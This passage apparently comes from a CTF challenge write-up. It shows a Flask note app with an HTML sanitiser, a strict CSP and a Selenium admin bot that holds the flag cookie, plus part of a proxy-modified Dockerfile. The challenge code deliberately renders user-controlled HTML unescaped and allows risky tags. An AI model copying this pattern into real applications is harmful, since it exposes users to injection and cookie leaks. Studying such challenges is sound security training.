</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>make_response</span><span class=p>,</span> <span class=n>render_template_string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span><span class=o>,</span> <span class=nn>base64</span><span class=o>,</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>threading</span><span class=o>,</span> <span class=nn>time</span><span class=o>,</span> <span class=nn>jsonify</span><span class=o>,</span> <span class=nn>nh3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>selenium</span> <span class=kn>import</span> <span class=n>webdriver</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>selenium.webdriver.chrome.options</span> <span class=kn>import</span> <span class=n>Options</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_limiter</span> <span class=kn>import</span> <span class=n>Limiter</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_limiter.util</span> <span class=kn>import</span> <span class=n>get_remote_address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>6005</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># flag charset is string.ascii_lowercase + string.digits</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ALLOWED_TAGS</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>,</span> <span class=s1>&#39;blockquote&#39;</span><span class=p>,</span> <span class=s1>&#39;br&#39;</span><span class=p>,</span> <span class=s1>&#39;code&#39;</span><span class=p>,</span> <span class=s1>&#39;div&#39;</span><span class=p>,</span> <span class=s1>&#39;em&#39;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=s1>&#39;h1&#39;</span><span class=p>,</span> <span class=s1>&#39;h2&#39;</span><span class=p>,</span> <span class=s1>&#39;h3&#39;</span><span class=p>,</span> <span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=s1>&#39;iframe&#39;</span><span class=p>,</span> <span class=s1>&#39;img&#39;</span><span class=p>,</span> <span class=s1>&#39;li&#39;</span><span class=p>,</span> <span class=s1>&#39;link&#39;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=s1>&#39;ol&#39;</span><span class=p>,</span> <span class=s1>&#39;p&#39;</span><span class=p>,</span> <span class=s1>&#39;pre&#39;</span><span class=p>,</span> <span class=s1>&#39;span&#39;</span><span class=p>,</span> <span class=s1>&#39;strong&#39;</span><span class=p>,</span> <span class=s1>&#39;ul&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>ALLOWED_ATTRIBUTES</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;href&#39;</span><span class=p>,</span> <span class=s1>&#39;target&#39;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;link&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;rel&#39;</span><span class=p>,</span> <span class=s1>&#39;href&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>,</span> <span class=s1>&#39;as&#39;</span><span class=p>},</span> 
</span></span><span class=line><span class=cl>    <span class=s1>&#39;*&#39;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;style&#39;</span><span class=p>,</span><span class=s1>&#39;src&#39;</span><span class=p>,</span> <span class=s1>&#39;width&#39;</span><span class=p>,</span> <span class=s1>&#39;height&#39;</span><span class=p>,</span> <span class=s1>&#39;alt&#39;</span><span class=p>,</span> <span class=s1>&#39;title&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;lang&#39;</span><span class=p>,</span> <span class=s1>&#39;dir&#39;</span><span class=p>,</span> <span class=s1>&#39;loading&#39;</span><span class=p>,</span> <span class=s1>&#39;role&#39;</span><span class=p>,</span> <span class=s1>&#39;aria-label&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>APP_LIMIT_TIME</span> <span class=o>=</span> <span class=mi>60</span>  
</span></span><span class=line><span class=cl><span class=n>APP_LIMIT_COUNT</span> <span class=o>=</span> <span class=mi>5</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>limiter</span> <span class=o>=</span> <span class=n>Limiter</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>get_remote_address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>=</span><span class=n>app</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>storage_uri</span><span class=o>=</span><span class=s2>&#34;memory://&#34;</span> 
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.errorhandler</span><span class=p>(</span><span class=mi>429</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ratelimit_handler</span><span class=p>(</span><span class=n>e</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;Too many requests, please try again later. Limit is </span><span class=si>{</span><span class=n>APP_LIMIT_COUNT</span><span class=si>}</span><span class=s2> requests per </span><span class=si>{</span><span class=n>APP_LIMIT_TIME</span><span class=si>}</span><span class=s2> seconds.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}),</span> <span class=mi>429</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>template</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;div class=&#34;head&#34;&gt;&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    {</span><span class=si>% i</span><span class=s2>f flag %}
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;div class=&#34;flag&#34;&gt;&lt;h1&gt;{{ flag }}&lt;/h1&gt;&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    {</span><span class=si>% e</span><span class=s2>ndif %}
</span></span></span><span class=line><span class=cl><span class=s2>    {</span><span class=si>% i</span><span class=s2>f note %}
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;div class=&#34;note&#34;&gt;{{ note | safe}}&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    {</span><span class=si>% e</span><span class=s2>ndif %}
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;script nonce=&#34;{{ nonce }}&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        Array.from(document.getElementsByClassName(&#39;flag&#39;)).forEach(function(element) {
</span></span></span><span class=line><span class=cl><span class=s2>            let text = element.innerText;
</span></span></span><span class=line><span class=cl><span class=s2>            element.innerHTML = &#39;&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>            for (let i = 0; i &lt; text.length; i++) {
</span></span></span><span class=line><span class=cl><span class=s2>                let charElem = document.createElement(&#39;span&#39;);
</span></span></span><span class=line><span class=cl><span class=s2>                charElem.innerText = text[i];
</span></span></span><span class=line><span class=cl><span class=s2>                element.appendChild(charElem);
</span></span></span><span class=line><span class=cl><span class=s2>            }
</span></span></span><span class=line><span class=cl><span class=s2>        });
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>_flag</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>nonce</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>_note</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;note&#39;</span><span class=p>,</span> <span class=s1>&#39;Try putting your note with /?note=..&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>clean_note</span> <span class=o>=</span> <span class=n>nh3</span><span class=o>.</span><span class=n>clean</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>_note</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=n>tags</span><span class=o>=</span><span class=n>ALLOWED_TAGS</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=n>attributes</span><span class=o>=</span><span class=n>ALLOWED_ATTRIBUTES</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>rendered</span> <span class=o>=</span> <span class=n>render_template_string</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>template</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>nonce</span><span class=o>=</span><span class=n>nonce</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=o>=</span><span class=n>_flag</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>note</span><span class=o>=</span><span class=n>clean_note</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>rendered</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Security-Policy&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;default-src &#39;none&#39;; script-src &#39;nonce-</span><span class=si>{</span><span class=n>nonce</span><span class=si>}</span><span class=s2>&#39;; style-src &#39;none&#39;; &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;base-uri &#39;none&#39;; frame-ancestors &#39;self&#39;; frame-src &#39;self&#39;; object-src &#39;none&#39;; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Referrer-Policy&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;no-referrer&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;X-Frame-Options&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;SAMEORIGIN&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;X-Content-Type-Options&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;nosniff&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>response</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>admin_visit</span><span class=p>(</span><span class=n>raw_data_b64</span><span class=p>:</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>raw_data_b64</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[BOT] base64 decode error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;http://127.0.0.1:6005/?note=</span><span class=si>{</span><span class=n>data</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[BOT] Visiting </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>options</span> <span class=o>=</span> <span class=n>Options</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--headless&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--no-sandbox&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--disable-dev-shm-usage&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--disable-gpu&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>driver</span> <span class=o>=</span> <span class=n>webdriver</span><span class=o>.</span><span class=n>Chrome</span><span class=p>(</span><span class=n>options</span><span class=o>=</span><span class=n>options</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;http://127.0.0.1:6005/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>driver</span><span class=o>.</span><span class=n>add_cookie</span><span class=p>({</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;flag&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;value&#39;</span><span class=p>:</span> <span class=n>flag</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;{&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;}&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>),</span> 
</span></span><span class=line><span class=cl>                <span class=s1>&#39;path&#39;</span><span class=p>:</span> <span class=s1>&#39;/&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;httpOnly&#39;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;sameSite&#39;</span><span class=p>:</span> <span class=s1>&#39;Strict&#39;</span>
</span></span><span class=line><span class=cl>            <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[BOT] Now visiting target URL </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>           
</span></span><span class=line><span class=cl>            <span class=n>driver</span><span class=o>.</span><span class=n>set_page_load_timeout</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[BOT] error during driver.get: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>driver</span><span class=o>.</span><span class=n>quit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[BOT] Done visiting URL </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[BOT] Unexpected bot error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/bot&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@limiter.limit</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>APP_LIMIT_COUNT</span><span class=si>}</span><span class=s2> per </span><span class=si>{</span><span class=n>APP_LIMIT_TIME</span><span class=si>}</span><span class=s2> second&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bot</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>raw_data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;note&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>raw_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>make_response</span><span class=p>(</span><span class=s2>&#34;Missing ?note parameter</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>admin_visit</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>raw_data</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>daemon</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>make_response</span><span class=p>(</span><span class=s2>&#34;Admin will visit this URL soon.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>202</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>port</span><span class=o>=</span><span class=n>PORT</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>为了方便启动容器，将 dockerfile 加上代理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> python:3.10-slim</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ARG</span> <span class=nv>HTTP_PROXY</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ARG</span> <span class=nv>HTTPS_PROXY</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ARG</span> <span class=nv>NO_PROXY</span><span class=o>=</span><span class=s2>&#34;localhost,127.0.0.1,.docker.internal&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>http_proxy</span><span class=o>=</span><span class=nv>$HTTP_PROXY</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>https_proxy</span><span class=o>=</span><span class=nv>$HTTPS_PROXY</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>no_proxy</span><span class=o>=</span><span class=nv>$NO_PROXY</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>PYTHONDONTWRITEBYTECODE</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>ENV</span> <span class=nv>PYTHONUNBUFFERED</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>RUN</span> apt-get update <span class=o>&amp;&amp;</span> apt-get install -y <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    chromium <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    chromium-driver <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    fonts-liberation <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libnss3 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libxss1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libappindicator3-1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libasound2 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libatk-bridge2.0-0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libgtk-3-0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libx11-xcb1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libxcomposite1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libxrandr2 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libgbm1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libxdamage1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libpango-1.0-0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    libpangocairo-1.0-0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --no-install-recommends <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    apt-get clean <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    rm -rf /var/lib/apt/lists/*<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>CHROME_BIN</span><span class=o>=</span>/usr/bin/chromium<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>CHROMEDRIVER_BIN</span><span class=o>=</span>/usr/bin/chromedriver<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> pip install --no-cache-dir flask selenium nh3 jsonify Flask-Limiter<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./flag.txt /app/flag.txt<span class=err>
